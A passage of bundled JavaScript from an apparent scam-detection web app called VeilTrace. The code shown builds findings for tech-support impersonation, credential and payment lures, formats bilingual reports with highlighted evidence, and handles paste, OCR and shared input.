      for (let u of s.units) for (let o of [...u.actions, ...u.channels]) used.add(o);
      for (let o of s.context) used.add(o);
      for (let m of s.modifiers) for (let e of m.evidence) typeof e != "string" && used.add(e);
    }
    let sortedObs = [...used].sort((a, b) => a.src.region.index - b.src.region.index || a.src.pos - b.src.pos || a.nStart - b.nStart || a.o.signal.localeCompare(b.o.signal)), idOf = /* @__PURE__ */ new Map();
    sortedObs.forEach((o, i) => idOf.set(o, `so${i}`));
    let ids = (list) => [...new Set([...list].map((o) => idOf.get(o)))].sort((a, b) => Number(a.slice(2)) - Number(b.slice(2))), findings = scored.map((s, i) => {
      let trust = ordered2(s.units.flatMap((u) => trustOf3(u.src))), evidence = [...s.units.flatMap((u) => [...u.actions, ...u.channels]), ...s.context], limitations = [];
      s.claims.length > 0 && limitations.push("claimed-identity-unverifiable"), trust.some((t2) => UNTRUSTED3.includes(t2)) && limitations.push("trust-boundary-heuristic"), evidence.some((o) => o.o.signal === "SX.PHONE" || o.o.signal === "SX.MOBILE") && limitations.push("contact-details-not-reported");
      let summary = SUMMARY4[s.ruleId];
      return s.modifiers.length > 0 && (summary += ` Context: ${s.modifiers.map((m) => m.reason).join(" ")}`), {
        id: `s${i}`,
        category: "support_impersonation",
        ruleId: s.ruleId,
        ruleName: SUPPORT_RULES[s.ruleId].name,
        classification: s.classification,
        ruleClassification: s.ruleClassification,
        confidence: s.confidence,
        actionRisk: s.actions.includes("remote-access") || s.actions.includes("install") ? "high" : "medium",
        requestedActions: s.actions,
        channels: s.channels,
        claims: s.claims,
        indicators: s.indicators,
        pressures: s.pressures,
        trustContext: trust,
        regionId: s.region.region.id,
        observationIds: ids(evidence),
        modifiers: s.modifiers.map((m) => ({ ...m, evidence: m.evidence.map((e) => typeof e == "string" ? e : idOf.get(e)) })),
        limitations,
        summary
      };
    }), verdict = "none";
    for (let f of findings) (verdict === "none" || TIERS4.indexOf(f.classification) > TIERS4.indexOf(verdict)) && (verdict = f.classification);
    return {
      detector: "support",
      detectorVersion: SUPPORT_DETECTOR_VERSION,
      experimental: !0,
      schemaVersion: 1,
      verdict,
      findings,
      observations: sortedObs.map((o) => ({ ...o.o, id: idOf.get(o) }))
    };
  }

  // src/core/coverage.ts
  function scanStatus(coverage) {
    let reasons = [];
    return coverage.partial ? reasons.push(...coverage.partial) : (coverage.truncated && reasons.push("extractor-truncated"), coverage.framesSkipped > 0 && reasons.push("frames-skipped"), coverage.closedShadowRootsSkipped > 0 && reasons.push("closed-shadow-skipped")), coverage.coreTruncated && reasons.push("core-truncated"), { complete: reasons.length === 0, reasons: [...new Set(reasons)] };
  }

  // src/extension/content/report.ts
  var REPORT_VERSION = 4, MAX_FINDINGS = 50, MAX_EVIDENCE_PER_FINDING = 12, MAX_SNIPPET_CHARS = 300, clip = (s) => s.length > MAX_SNIPPET_CHARS ? `${s.slice(0, MAX_SNIPPET_CHARS - 1)}\u2026` : s, round = (n) => Math.round(n * 10) / 10, RANK = { manipulative_instruction: 2, suspicious_correlation: 1, observed_instruction: 0 };
  function credentialSection(snapshot, cred) {
    let obsById = new Map(cred.observations.map((o) => [o.id, o])), item = (o) => {
      let src = o.source;
      if (src.type === "block")
        return { signal: o.signal, text: clip(o.text), source: "visible-text", locator: snapshot.blocks.find((b) => b.id === src.blockId)?.locator ?? null, fieldKind: null };
      let field = snapshot.formFields?.find((f) => f.id === src.fieldId);
      return { signal: o.signal, text: clip(o.text), source: "form-field", locator: field?.locator ?? null, fieldKind: field?.kind ?? null };
    }, findings = [...cred.findings].sort((a, b) => RANK[b.classification] - RANK[a.classification]).slice(0, MAX_FINDINGS).map((f) => ({
      id: f.id,
      ruleId: f.ruleId,
      classification: f.classification,
      ruleClassification: f.ruleClassification,
      confidence: f.confidence,
      actionRisk: f.actionRisk,
      requestedAction: f.requestedAction,
      secretTypes: [...f.secretTypes],
      pretexts: [...f.pretexts],
      trustContext: [...f.trustContext],
      formDestination: f.formDestination ?? null,
      modifiers: f.modifiers.map((m) => m.id),
      overrides: f.overrides.map((o) => o.id),
      limitations: [...f.limitations],
      evidence: f.observationIds.slice(0, MAX_EVIDENCE_PER_FINDING).flatMap((id) => {
        let o = obsById.get(id);
        return o ? [item(o)] : [];
      }),
      evidenceTotal: f.observationIds.length
    }));
    return { detectorVersion: cred.detectorVersion, experimental: !0, verdict: cred.verdict, findings, findingsTotal: cred.findings.length };
  }
  function paymentSection(snapshot, pay) {
    let obsById = new Map(pay.observations.map((o) => [o.id, o])), item = (o) => ({
      signal: o.signal,
      text: clip(o.text),
      locator: snapshot.blocks.find((b) => b.id === o.blockId)?.locator ?? null
    }), findings = [...pay.findings].sort((a, b) => RANK[b.classification] - RANK[a.classification]).slice(0, MAX_FINDINGS).map((f) => ({
      id: f.id,
      ruleId: f.ruleId,
      classification: f.classification,
      ruleClassification: f.ruleClassification,
      confidence: f.confidence,
      actionRisk: f.actionRisk,
      promises: [...f.promises],
      destinations: [...f.destinations],
      pressures: [...f.pressures],
      trustContext: [...f.trustContext],
      modifiers: f.modifiers.map((m) => m.id),
      limitations: [...f.limitations],
      evidence: f.observationIds.slice(0, MAX_EVIDENCE_PER_FINDING).flatMap((id) => {
        let o = obsById.get(id);
        return o ? [item(o)] : [];
      }),
      evidenceTotal: f.observationIds.length
    }));
    return { detectorVersion: pay.detectorVersion, experimental: !0, verdict: pay.verdict, findings, findingsTotal: pay.findings.length };
  }
  function supportSection(snapshot, sup) {
    let obsById = new Map(sup.observations.map((o) => [o.id, o])), item = (o) => ({
      signal: o.signal,
      text: clip(o.text),
      locator: snapshot.blocks.find((b) => b.id === o.blockId)?.locator ?? null
    }), findings = [...sup.findings].sort((a, b) => RANK[b.classification] - RANK[a.classification]).slice(0, MAX_FINDINGS).map((f) => ({
      id: f.id,
      ruleId: f.ruleId,
      classification: f.classification,
      ruleClassification: f.ruleClassification,
      confidence: f.confidence,
      actionRisk: f.actionRisk,
      requestedActions: [...f.requestedActions],
      channels: [...f.channels],
      claims: [...f.claims],
      indicators: [...f.indicators],
      pressures: [...f.pressures],
      trustContext: [...f.trustContext],
      modifiers: f.modifiers.map((m) => m.id),
      limitations: [...f.limitations],
      evidence: f.observationIds.slice(0, MAX_EVIDENCE_PER_FINDING).flatMap((id) => {
        let o = obsById.get(id);
        return o ? [item(o)] : [];
      }),
      evidenceTotal: f.observationIds.length
    }));
    return { detectorVersion: sup.detectorVersion, experimental: !0, verdict: sup.verdict, findings, findingsTotal: sup.findings.length };
  }
  function buildReport(snapshot, result, versions, timing, cred, pay, sup) {
    let obsById = new Map(result.observations.map((o) => [o.id, o])), item = (o) => {
      let src = o.source, locator = src.type === "block" ? snapshot.blocks.find((b) => b.id === src.blockId)?.locator : src.type === "hiddenCopy" ? snapshot.hiddenCopyCandidates.find((h2) => h2.id === src.candidateId)?.locator : snapshot.copyTriggers.find((t2) => t2.id === src.triggerId)?.locator, source = src.type === "block" ? "visible-text" : src.type === "hiddenCopy" ? "hidden-clipboard" : "copy-control";
      return { signal: o.signal, text: clip(o.text), source, locator: locator ?? null, deobfuscated: o.deobfuscated };
    }, items2 = (ids) => ids.slice(0, MAX_EVIDENCE_PER_FINDING).flatMap((id) => {
      let o = obsById.get(id);
      return o ? [item(o)] : [];
    }), findings = [...result.findings].sort((a, b) => RANK[b.classification] - RANK[a.classification]).slice(0, MAX_FINDINGS).map((f) => ({
      id: f.id,
      ruleId: f.ruleId,
      ruleName: f.ruleName,
      classification: f.classification,
      ruleClassification: f.ruleClassification,
      confidence: f.confidence,
      actionRisk: f.actionRisk,
      summary: f.summary,
      modifiers: f.modifiers.map((m) => ({ id: m.id, reason: m.reason })),
      overrides: (f.overrides ?? []).map((o) => ({ id: o.id, effect: o.effect, suppressed: [...o.suppressed], evidence: items2(o.evidence) })),
      evidence: items2(f.observationIds),
      evidenceTotal: f.observationIds.length
    }));
    return {
      v: REPORT_VERSION,
      engineVersion: versions.engine,
      extractorVersion: versions.extractor,
      verdict: result.verdict,
      findings,
      coverage: result.coverage,
      status: scanStatus(result.coverage),
      counts: {
        blocks: snapshot.blocks.length,
        hiddenCopyCandidates: snapshot.hiddenCopyCandidates.length,
        copyTriggers: snapshot.copyTriggers.length,
        observations: result.observations.length,
        findingsTotal: result.findings.length
      },
      credential: cred ? credentialSection(snapshot, cred) : { detectorVersion: "", experimental: !0, verdict: "none", findings: [], findingsTotal: 0 },
      payment: pay ? paymentSection(snapshot, pay) : { detectorVersion: "", experimental: !0, verdict: "none", findings: [], findingsTotal: 0 },
      support: sup ? supportSection(snapshot, sup) : { detectorVersion: "", experimental: !0, verdict: "none", findings: [], findingsTotal: 0 },
      timing: {
        extractMs: round(timing.extractMs),
        analyzeMs: round(timing.analyzeMs),
        credentialMs: round(timing.credentialMs ?? 0),
        paymentMs: round(timing.paymentMs ?? 0),
        supportMs: round(timing.supportMs ?? 0)
      }
    };
  }

  // src/pwa/message.ts
  var MAX_MESSAGE_CHARS = 2e4, MAX_LINES = 400, CONTAINER = { chat: "ugc:#message", sms: "ugc:#message", email: "ugc:#message", web: "body" };
  function messageSnapshot(text, source) {
    let lines = text.slice(0, MAX_MESSAGE_CHARS).replace(/\r\n?/g, `
`).split(`
`).map((t2) => t2.trim()).filter(Boolean), truncated = text.length > MAX_MESSAGE_CHARS || lines.length > MAX_LINES;
    return {
      schemaVersion: 1,
      url: "about:blank",
      title: "",
      lang: null,
      blocks: lines.slice(0, MAX_LINES).map((t2, i) => ({ id: `b${i}`, text: t2, containerId: CONTAINER[source], locator: `#line-${i}`, ctx: {}, headingContext: null })),
      hiddenCopyCandidates: [],
      copyTriggers: [],
      coverage: { framesSkipped: 0, truncated, closedShadowRootsSkipped: 0, ...truncated ? { partial: ["char-budget"] } : {} }
    };
  }
  function isLinkOnly(text) {
    let links = text.match(/https?:\/\/\S+|www\.\S+|\b[a-z0-9-]+(?:\.[a-z0-9-]+)+\/\S*/giu) ?? [], rest = text.replace(/https?:\/\/\S+|www\.\S+|\b[a-z0-9-]+(?:\.[a-z0-9-]+)+\/\S*/giu, " ").match(new RegExp("\\p{L}{2,}", "gu")) ?? [];
    return links.length > 0 && rest.length < 3;
  }
  function checkMessage(text, source) {
    let s = messageSnapshot(text, source), t0 = performance.now(), result = analyze(s), t1 = performance.now(), cred = analyzeCredentials(s), t2 = performance.now(), pay = analyzePayments(s), t3 = performance.now(), sup = analyzeSupport(s), t4 = performance.now();
    return buildReport(
      s,
      result,
      { engine: result.engineVersion, extractor: "message" },
      { extractMs: 0, analyzeMs: t1 - t0, credentialMs: t2 - t1, paymentMs: t3 - t2, supportMs: t4 - t3 },
      cred,
      pay,
      sup
    );
  }

  // src/pwa/app.ts
  var SHARED_CACHE = "veiltrace-share", SHARED_KEY = "./__shared__", SHARED_IMAGE_KEY = "./__shared_image__", LANG_KEY = "veiltrace-lang";
  function storedLang() {
    try {
      return localStorage.getItem(LANG_KEY) === "id" ? "id" : "en";
    } catch {
      return "en";
    }
  }
  function storeLang(lang) {
    try {
      localStorage.setItem(LANG_KEY, lang);
    } catch {
    }
  }
  var $ = (id) => document.getElementById(id);
  function h(tag, attrs = {}, ...children) {
    let el = document.createElement(tag);
    for (let [k, v] of Object.entries(attrs)) el.setAttribute(k, v);
    for (let c of children) c != null && c !== !1 && el.append(typeof c == "string" ? document.createTextNode(c) : c);
    return el;
  }
  var state = {
    lang: storedLang(),
    report: null,
    text: "",
    note: null
  }, t = () => MESSAGES[state.lang], SOURCES = ["chat", "sms", "email", "web"];
  function markedMessage(text, snippets) {
    let ranges = [];
    for (let s of new Set(snippets.filter((x) => x.length > 1))) {
      let lower = text.toLowerCase(), i = lower.indexOf(s.toLowerCase());
      for (; i >= 0; )
        ranges.push([i, i + s.length]), i = lower.indexOf(s.toLowerCase(), i + s.length);
    }
    ranges.sort((a, b) => a[0] - b[0]);
    let box = h("div", { class: "message", lang: "" }), pos = 0;
    for (let [a, b] of ranges)
      a < pos || (box.append(document.createTextNode(text.slice(pos, a)), h("mark", {}, text.slice(a, b))), pos = b);
    return box.append(document.createTextNode(text.slice(pos))), box;
  }
  function items(r) {
    let m = t(), signal = (cat, s) => (cat === "command" ? m.signal[s] : cat === "credential" ? m.cred.signal[s] : cat === "payment" ? m.pay.signal[s] : m.sup.signal[s]) ?? s, shown = (s, text) => s === "PA.AMOUNT" ? m.pay.amountHidden : s === "SX.PHONE" || s === "SX.MOBILE" ? m.sup.contactHidden : text;
    return [
      ...r.findings.map((f) => ({
        category: "command",
        classification: f.classification,
        title: m.findingTitle[f.classification],
        explain: m.rule[f.ruleId],
        rule: m.ruleChip(f.ruleId),
        confidence: m.confidence[f.confidence],
        risk: m.dash.actionRiskChip[f.actionRisk],
        evidence: f.evidence.map((e) => [signal("command", e.signal), e.text])
      })),
      ...r.credential.findings.map((f) => ({
        category: "credential",
        classification: f.classification,
        title: m.cred.findingTitle[f.classification],
        explain: m.cred.rule[f.ruleId],
        rule: m.cred.ruleChip(f.ruleId),
        confidence: m.confidence[f.confidence],
        risk: m.dash.actionRiskChip[f.actionRisk],
        evidence: f.evidence.map((e) => [signal("credential", e.signal), e.text])
      })),
      ...r.payment.findings.map((f) => ({
        category: "payment",
        classification: f.classification,
        title: m.pay.findingTitle[f.classification],
        explain: m.pay.rule[f.ruleId],
        rule: m.pay.ruleChip(f.ruleId),
        confidence: m.confidence[f.confidence],
        risk: m.dash.actionRiskChip[f.actionRisk],
        evidence: f.evidence.map((e) => [signal("payment", e.signal), shown(e.signal, e.text)])
      })),
      ...r.support.findings.map((f) => ({
        category: "support",
        classification: f.classification,
        title: m.sup.findingTitle[f.classification],
        explain: m.sup.rule[f.ruleId],
        rule: m.sup.ruleChip(f.ruleId),
        confidence: m.confidence[f.confidence],
        risk: m.dash.actionRiskChip[f.actionRisk],
        evidence: f.evidence.map((e) => [signal("support", e.signal), shown(e.signal, e.text)])
      }))
    ];
  }
  var RANK2 = { manipulative_instruction: 2, suspicious_correlation: 1, observed_instruction: 0 };
  function card(it) {
    let m = t();
    return h(
      "article",
      { class: "card finding", "data-category": it.category, "data-classification": it.classification },
      h("div", { class: "category" }, `${m.dash.categoryCode[it.category]} \xB7 ${m.dash.categoryName[it.category]}`),
      h("h4", {}, it.title),
      h(
        "div",
        { class: "chips" },
        h("span", { class: `chip ${it.classification}` }, m.classification[it.classification]),
        h("span", { class: "chip" }, it.confidence),
        h("span", { class: "chip" }, it.risk),
        h("span", { class: "chip" }, it.rule)
      ),
      h("p", { class: "explain" }, it.explain),
      h("ul", { class: "ev", "aria-label": m.evidenceAria }, ...it.evidence.map(([label, text]) => h("li", {}, `${label}: `, h("b", { lang: "" }, text))))
    );
  }
  function renderResult(r) {
    let m = t(), d = aggregate(r), head = m.dash.headline[d.highest], all = items(r).sort((a, b) => (RANK2[b.classification] ?? 0) - (RANK2[a.classification] ?? 0)), alerting = all.filter((x) => x.classification !== "observed_instruction"), observed = all.filter((x) => x.classification === "observed_instruction"), remote = r.support.findings.some((f) => f.classification !== "observed_instruction" && (f.requestedActions.includes("remote-access") || f.requestedActions.includes("install"))), advice = d.affected.map((c) => [c, m.dash.advice[c]]);
    return remote && advice.push(["remoteAccess", m.dash.advice.remoteAccess]), [
      h(
        "div",
        { class: `card threat tone-${head.tone}`, "data-verdict": d.highest },
        h("div", { class: "panel-label" }, m.pwa.assessment),
        h("h3", {}, head.title),
        h("p", {}, m.pwa.headlineDetail[d.highest]),
        h("div", { class: "cats" }, `${m.dash.statActionable}: ${formatCount(d.actionable, state.lang)} \xB7 ${m.dash.statCategories}: ${d.affected.length > 0 ? d.affected.map((c) => m.dash.categoryCode[c]).join(" \xB7 ") : m.dash.noCategories}`)
      ),
      h(
        "div",
        { class: "card advice", "data-advice": advice.map(([k]) => k).join(" ") || "none" },
        h("div", { class: "panel-label" }, m.dash.adviceTitle),
        advice.length > 0 ? h("ul", {}, ...advice.map(([k, x]) => h("li", { "data-advice": k }, x))) : h("p", {}, m.dash.adviceNone)
      ),
      h("div", { class: "card" }, h("div", { class: "panel-label" }, m.pwa.yourMessage), markedMessage(state.text.slice(0, MAX_MESSAGE_CHARS), all.flatMap((x) => x.evidence.map(([, e]) => e)))),
      ...alerting.map(card),
      observed.length > 0 && h("details", { class: "observed" }, h("summary", {}, m.dash.observedTitle(observed.length)), ...observed.map(card))
    ];
  }
  function render() {
    let m = t();
    document.documentElement.lang = state.lang, document.title = `VeilTrace \xB7 ${m.pwa.title}`, document.body.dataset.lang = state.lang;
    for (let l of ["en", "id"]) $(`lang-${l}`).setAttribute("aria-pressed", String(state.lang === l));
    $("tagline").textContent = m.tagline, $("title").textContent = m.pwa.title, $("intro").textContent = m.pwa.intro, $("source-label").textContent = m.pwa.sourceLabel;
    let select2 = $("source"), current = select2.value || "chat";
    select2.replaceChildren(...SOURCES.map((s) => h("option", { value: s }, m.pwa.source[s]))), select2.value = current, $("message").placeholder = m.pwa.placeholder, $("check").textContent = m.pwa.check, $("image").textContent = m.pwa.image, $("paste").textContent = m.pwa.paste, $("clear").textContent = m.pwa.clear, $("privacy").textContent = m.pwa.privacy, $("share-hint").textContent = m.pwa.shareHint, $("meta").textContent = `VeilTrace 0.8.0${state.report ? ` \xB7 Engine ${state.report.engineVersion}` : ""}`, $("status").textContent = state.note ?? "";
    let result = $("result");
    state.report ? (result.replaceChildren(...renderResult(state.report).filter((p) => p instanceof Node)), result.hidden = !1) : (result.replaceChildren(), result.hidden = !0);
  }
  function check() {
    let text = $("message").value;
    if (!text.trim()) {
      Object.assign(state, { report: null, note: t().pwa.empty }), render();
      return;
    }
    state.text = text, state.report = checkMessage(text, $("source").value), state.note = isLinkOnly(text) ? t().pwa.linkOnly : text.length > MAX_MESSAGE_CHARS ? t().pwa.tooLong : null, document.body.dataset.state = "done", render(), $("result").scrollIntoView({ block: "start", behavior: "smooth" });
  }
  var ocrApi = null;
  function loadOcr() {
    return ocrApi ??= new Promise((resolve, reject) => {
      let s = document.createElement("script");
      s.src = "ocr/ocr.js", s.onload = () => {
        let api = window.__vtOcr;
        api ? resolve(api) : reject(new Error("ocr unavailable"));
      }, s.onerror = () => reject(new Error("ocr unavailable")), document.head.append(s);
    }).catch((e) => {
      throw ocrApi = null, e;
    }), ocrApi;
  }
  async function checkImage(image) {
    let show = (note) => {
      state.note = note, $("status").textContent = note;
    }, box = $("message");
    show(t().pwa.ocrProgress(0)), document.body.dataset.ocr = "running";
    try {
      let lines = await (await loadOcr()).recognize(image, (p) => show(t().pwa.ocrProgress(Math.round(p * 100))));
      if (lines.length === 0) {
        show(t().pwa.ocrEmpty), document.body.dataset.ocr = "empty";
        return;
      }
      box.value = lines.join(`
`), check(), show(t().pwa.ocrDone), document.body.dataset.ocr = "done";
    } catch {
      show(t().pwa.ocrFailed), document.body.dataset.ocr = "failed";
    }
  }
  async function takeShared() {
    if (!new URLSearchParams(location.search).has("shared") || !("caches" in window)) return null;
    history.replaceState(null, "", location.pathname);
    let cache = await caches.open(SHARED_CACHE), res = await cache.match(SHARED_KEY);
    return await cache.delete(SHARED_KEY), res ? res.text() : null;
  }
  async function takeSharedImage() {
    if (!("caches" in window)) return null;
    let cache = await caches.open(SHARED_CACHE), res = await cache.match(SHARED_IMAGE_KEY);
    return await cache.delete(SHARED_IMAGE_KEY), res ? res.blob() : null;
  }
  async function main() {
    for (let l of ["en", "id"]) $(`lang-${l}`).addEventListener("click", () => {
      state.lang = l, storeLang(l), render();
    });
    $("check").addEventListener("click", check), $("clear").addEventListener("click", () => {
      $("message").value = "", Object.assign(state, { report: null, text: "", note: null }), document.body.dataset.state = "idle", render();
    }), $("paste").addEventListener("click", async () => {
      try {
        $("message").value = await navigator.clipboard.readText();
      } catch {
        $("message").focus();
      }
    });
    let input = $("image-input");
    $("image").addEventListener("click", () => input.click()), input.addEventListener("change", () => {
      let file = input.files?.[0];
      input.value = "", file && checkImage(file);
    }), render();
    let wasShared = new URLSearchParams(location.search).has("shared"), shared = await takeShared().catch(() => null), sharedImage = wasShared ? await takeSharedImage().catch(() => null) : null;
    sharedImage && !shared && checkImage(sharedImage), shared && ($("message").value = shared, check()), "serviceWorker" in navigator && location.protocol !== "file:" && navigator.serviceWorker.register("sw.js").then(() => navigator.serviceWorker.ready).then(() => {
      document.body.dataset.offline = "ready";
    }).catch(() => {
    });
  }
  main();
})();
